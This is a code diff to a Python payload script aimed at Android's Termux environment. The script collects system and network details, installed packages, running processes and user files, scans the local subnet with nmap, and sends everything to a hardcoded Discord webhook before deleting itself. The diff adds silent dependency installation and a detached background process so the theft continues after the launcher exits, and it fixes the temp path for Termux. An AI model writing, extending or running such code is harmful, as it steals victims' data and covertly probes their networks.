@@ -8,11 +8,13 @@ from pathlib import Path
 WEBHOOK_URL = "https://discord.com/api/webhooks/1527523825946726440/2fMDRzaPvW8s19OuWTJrHTo6vjsGXLEog4eIpUbYS_vmlg9e2WzYRGZYkfpUja-alzpV"
 # ============================================================
 
-TMP_DIR = f"/tmp/payload_{os.getpid()}"
+# ---- FIX: Use Termux writable temp directory ----
+PREFIX = os.environ.get('PREFIX', '/data/data/com.termux/files/usr')
+TMP_DIR = os.path.join(PREFIX, 'tmp', f'payload_{os.getpid()}')
 os.makedirs(TMP_DIR, exist_ok=True)
 
 def log(msg):
-    with open(f"{TMP_DIR}/debug.log", "a") as f:
+    with open(os.path.join(TMP_DIR, "debug.log"), "a") as f:
         f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\n")
 
 def send_discord(content=None, file_path=None):
@@ -56,15 +58,12 @@ def get_system_info():
 def get_network_info():
     info = {}
     try:
-        # Get local IP
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         info["local_ip"] = s.getsockname()[0]
         s.close()
     except:
         info["local_ip"] = "N/A"
-    
-    # Get network interfaces
     try:
         import netifaces
         info["interfaces"] = {}
@@ -76,18 +75,15 @@ def get_network_info():
             }
     except:
         info["interfaces"] = "netifaces not installed"
-    
     return info
 
 def nmap_scan(target="192.168.1.0/24", ports="22,80,443,8080"):
-    """Perform nmap scan on local network"""
     results = {"target": target, "ports": ports, "hosts": []}
     try:
         import nmap
         nm = nmap.PortScanner()
         log(f"Starting nmap scan: {target} - ports {ports}")
         scan_result = nm.scan(hosts=target, ports=ports, arguments="-sV -T4")
-        
         for host in nm.all_hosts():
             host_info = {
                 "host": host,
@@ -145,10 +141,8 @@ def collect_files():
     return files
 
 def get_installed_packages():
-    """Get list of installed packages (pip and pkg)"""
     packages = {}
     try:
-        # pip packages
         pip_list = run_cmd("pip list --format=json")
         try:
             import json
@@ -157,18 +151,14 @@ def get_installed_packages():
             packages["pip"] = pip_list[:1000]
     except:
         packages["pip"] = "N/A"
-    
     try:
-        # termux packages
         pkg_list = run_cmd("pkg list-installed 2>/dev/null | head -100")
         packages["termux"] = pkg_list
     except:
         packages["termux"] = "N/A"
-    
     return packages
 
 def get_processes():
-    """Get running processes"""
     try:
         if platform.system() == "Linux":
             return run_cmd("ps aux | head -50")
@@ -178,45 +168,31 @@ def get_processes():
         return "N/A"
 
 def run_background(targets=None):
-    """Main payload function - runs in background thread"""
     try:
         log("Payload started in background")
-        
-        # 1. System info
         info = get_system_info()
         send_discord(f"**System Info**\n```json\n{json.dumps(info, indent=2)}\n```")
-        
-        # 2. Network info
         net_info = get_network_info()
         send_discord(f"**Network Info**\n```json\n{json.dumps(net_info, indent=2)}\n```")
-        
-        # 3. Nmap scan (if nmap installed)
         if targets:
             scan_results = nmap_scan(targets)
             send_discord(f"**Nmap Scan Results**\n```json\n{json.dumps(scan_results, indent=2)[:1900]}\n```")
         else:
-            # Auto-detect network
             try:
                 local_ip = socket.gethostbyname(socket.gethostname())
-                if local_ip.startswith("192.168.") or local_ip.startswith("10.") or local_ip.startswith("172."):
+                if local_ip.startswith(("192.168.", "10.", "172.")):
                     base = ".".join(local_ip.split(".")[:3]) + ".0/24"
                     scan_results = nmap_scan(base)
                     send_discord(f"**Nmap Scan Results**\n```json\n{json.dumps(scan_results, indent=2)[:1900]}\n```")
             except:
                 pass
-        
-        # 4. Installed packages
         packages = get_installed_packages()
         send_discord(f"**Installed Packages**\n```json\n{json.dumps(packages, indent=2)[:1900]}\n```")
-        
-        # 5. Running processes
         procs = get_processes()
         send_discord(f"**Running Processes**\n```\n{procs[:1500]}\n```")
-        
-        # 6. Files
         files = collect_files()
         if files:
-            zip_path = f"{TMP_DIR}/files.zip"
+            zip_path = os.path.join(TMP_DIR, "files.zip")
             try:
                 import zipfile
                 with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
@@ -229,25 +205,27 @@ def run_background(targets=None):
                     send_discord(f"📁 Files ({len(files)} files, max 50 in zip)", zip_path)
             except Exception as e:
                 log(f"Zip error: {e}")
-        
-        # 7. Self-destruct
         log("Payload completed")
         try:
             shutil.rmtree(TMP_DIR, ignore_errors=True)
             os.remove(__file__)
         except:
             pass
-            
     except Exception as e:
         log(f"Fatal error: {e}")
 
 def main():
-    # Run payload in background thread
-    import threading
+    # Auto‑install dependencies if missing
+    try:
+        import requests, nmap, netifaces
+    except ImportError:
+        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "python-nmap", "netifaces"],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    # Use multiprocessing so the payload continues after main exits
+    from multiprocessing import Process
     target = sys.argv[1] if len(sys.argv) > 1 else None
-    thread = threading.Thread(target=run_background, args=(target,), daemon=True)
-    thread.start()
-    # Exit immediately - payload continues in background
+    p = Process(target=run_background, args=(target,))
+    p.start()
     sys.exit(0)
 
 if __name__ == "__main__":
